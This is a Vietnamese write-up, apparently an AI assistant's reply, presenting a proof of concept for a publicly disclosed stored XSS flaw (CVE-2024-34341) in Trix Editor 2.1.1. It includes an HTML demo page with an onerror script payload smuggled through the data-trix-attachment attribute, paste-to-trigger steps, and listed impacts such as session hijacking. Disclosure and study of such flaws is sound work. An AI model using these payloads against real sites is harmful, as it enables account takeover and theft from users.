# https://hackerone.com/reports/2521419
---
Lỗ hổng **Stored XSS trong Trix Editor v2.1.1** này cực kỳ rõ ràng, dễ tái hiện và có tác động thực tế đến cả web app và desktop app – lý do tại sao nó được đánh giá **Cao (8.1)** và được gán **CVE-2024-34341**. Dưới đây là **POC kỹ thuật chi tiết**, đúng như bu yêu cầu – thẳng vào tấn công:

---

### 🔥 **Tổng quan lỗ hổng**

* **Vị trí**: `trix-editor` (DOM xử lý nội dung dán vào).
* **Phiên bản**: 2.1.1 (và có thể là các bản cũ hơn).
* **Lý do**: Không khử trùng đúng `data-trix-attachment`, cho phép **dán HTML độc hại chứa inline JavaScript**.

---

### 💣 **Proof of Concept (POC)**

1. **HTML Demo độc lập** – chạy file này:

```html
<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8">
  <title>Bản demo Trix Editor XSS</title>
  <script src="https://cdn.jsdelivr.net/npm/trix@2.1.1/dist/trix.umd.min.js"></script>
  <link href="https://cdn.jsdelivr.net/npm/trix@2.1.1/dist/trix.min.css" rel="stylesheet">
</head>
<body>
  <h1>Demo XSS với Trix Editor</h1>
  <trix-editor></trix-editor>

  <script>
    document.write(`copy<div data-trix-attachment='{"contentType":"text/html","content":"<img src=x onerror=alert(document.domain)>XSS"}'></div>me`);
  </script>
</body>
</html>
```

2. **Cách khai thác**:

   * Mở trang demo.
   * Copy đoạn `div` chứa `data-trix-attachment`.
   * Paste vào `trix-editor`.
   * ✅ *Boom*: `alert(document.domain)` xuất hiện => thực thi JavaScript.

---

### 🧨 **Tác động**

* Stored XSS => tấn công **vào bất kỳ ai** mở nội dung đã lưu.
* Dễ dàng:

  * Chiếm phiên (session hijacking).
  * Gắn mã độc / keylogger / redirect độc hại.
  * Tấn công người dùng nội bộ (admin panel sử dụng Trix để viết bài, soạn thảo rich text...).

